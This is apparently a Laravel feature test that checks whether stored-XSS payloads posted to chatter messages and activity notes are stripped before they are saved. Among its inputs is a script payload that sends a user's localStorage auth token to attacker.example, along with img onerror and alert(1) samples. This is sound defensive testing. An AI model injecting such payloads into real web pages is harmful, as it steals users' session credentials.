<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\User;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Tests\TenantTestCase;

/**
 * Issue #79 (MEDIUM, stored XSS) — chatter bodies are plain text but were
 * stored and returned verbatim, so any consumer rendering them as HTML would
 * execute attacker script. Bodies and activity text are now sanitized on write.
 */
class HR79ChatterBodySanitizationTest extends TenantTestCase
{
    private string $tenantId;

    protected function setUp(): void
    {
        parent::setUp();
        $this->tenantId = (string) Str::uuid();
        $this->bindTenantContext($this->tenantId);
        $this->seed(RolePermissionSeeder::class);

        DB::table('public.tenants')->updateOrInsert(
            ['id' => $this->tenantId],
            ['name' => 'HR79 Tenant', 'email' => 'hr79-'.Str::random(6).'@example.com', 'created_at' => now(), 'updated_at' => now()]
        );
        User::factory()->create();
    }

    private function actingAsAdmin(): User
    {
        $user = User::factory()->create();
        DB::table('public.users')->updateOrInsert(
            ['email' => $user->email],
            ['name' => $user->name, 'password' => $user->password, 'created_at' => now(), 'updated_at' => now()]
        );
        $centralId = DB::table('public.users')->where('email', $user->email)->value('id');
        DB::table('user_company_access')->updateOrInsert(
            ['user_id' => $centralId, 'tenant_id' => $this->tenantId],
            ['role' => 'admin', 'is_default' => true, 'created_at' => now(), 'updated_at' => now()]
        );
        $user->assignRole('Admin');

        return $user;
    }

    private function makeInvoice(int $userId): int
    {
        $customerId = DB::table('customers')->insertGetId([
            'name' => 'HR79 Customer', 'created_at' => now(), 'updated_at' => now(),
        ]);

        return DB::table('invoices')->insertGetId([
            'invoice_number' => 'INV-HR79-'.Str::random(6),
            'customer_id' => $customerId,
            'invoice_date' => '2026-01-01',
            'due_date' => '2026-01-31',
            'subtotal' => 100, 'tax_amount' => 0, 'discount_amount' => 0,
            'shipping_cost' => 0, 'total' => 100, 'status' => 'posted',
            'lifecycle_status' => 'posted', 'version_number' => 1, 'is_active_version' => true,
            'created_by' => $userId,
            'created_at' => now(), 'updated_at' => now(),
        ]);
    }

    private function subjectPath(int $invoiceId): string
    {
        return '/api/v1/chatter/'.rawurlencode('App\Models\Invoice').'/'.$invoiceId;
    }

    public function test_script_payload_in_message_body_is_stripped(): void
    {
        $user = $this->actingAsAdmin();
        $invoiceId = $this->makeInvoice($user->id);

        $payload = '<script>fetch("https://attacker.example/steal?t="+localStorage.getItem("auth_token"))</script>Hello team';

        $response = $this->actingAs($user)->postJson($this->subjectPath($invoiceId).'/messages', ['body' => $payload]);
        $response->assertStatus(201, $response->getContent());

        $body = $response->json('data.body');
        $this->assertStringNotContainsString('<script', $body);
        $this->assertStringNotContainsString('localStorage', $body);
        $this->assertStringContainsString('Hello team', $body);

        // Stored value is sanitized too (defence in depth for other consumers).
        $stored = DB::table('chatter_messages')->where('id', $response->json('data.id'))->value('body');
        $this->assertStringNotContainsString('<script', $stored);
    }

    public function test_img_onerror_payload_is_stripped(): void
    {
        $user = $this->actingAsAdmin();
        $invoiceId = $this->makeInvoice($user->id);

        $response = $this->actingAs($user)->postJson($this->subjectPath($invoiceId).'/messages', [
            'body' => '<img src=x onerror="alert(1)">Invoice received',
        ]);

        $response->assertStatus(201);
        $body = $response->json('data.body');

        $this->assertStringNotContainsString('<img', $body);
        $this->assertStringNotContainsString('onerror', $body);
        $this->assertStringContainsString('Invoice received', $body);
    }

    public function test_activity_summary_and_note_are_sanitized(): void
    {
        $user = $this->actingAsAdmin();
        $invoiceId = $this->makeInvoice($user->id);

        $response = $this->actingAs($user)->postJson($this->subjectPath($invoiceId).'/activities', [
            'activity_type' => 'call',
            'summary' => '<b>Call</b> supplier',
            'note' => '<script>alert(1)</script>Discuss pricing',
        ]);

        $response->assertStatus(201, $response->getContent());

        $summary = $response->json('data.summary');
        $note = $response->json('data.note');

        $this->assertStringNotContainsString('<b>', $summary);
        $this->assertStringContainsString('Call supplier', $summary);
        $this->assertStringNotContainsString('<script', (string) $note);
        $this->assertStringContainsString('Discuss pricing', (string) $note);
    }

    public function test_plain_text_newlines_are_preserved(): void
    {
        $user = $this->actingAsAdmin();
        $invoiceId = $this->makeInvoice($user->id);

        $response = $this->actingAs($user)->postJson($this->subjectPath($invoiceId).'/messages', [
            'body' => "Line one\nLine two\n\nLine four",
        ]);

        $response->assertStatus(201);

        $this->assertSame("Line one\nLine two\n\nLine four", $response->json('data.body'));
    }
}
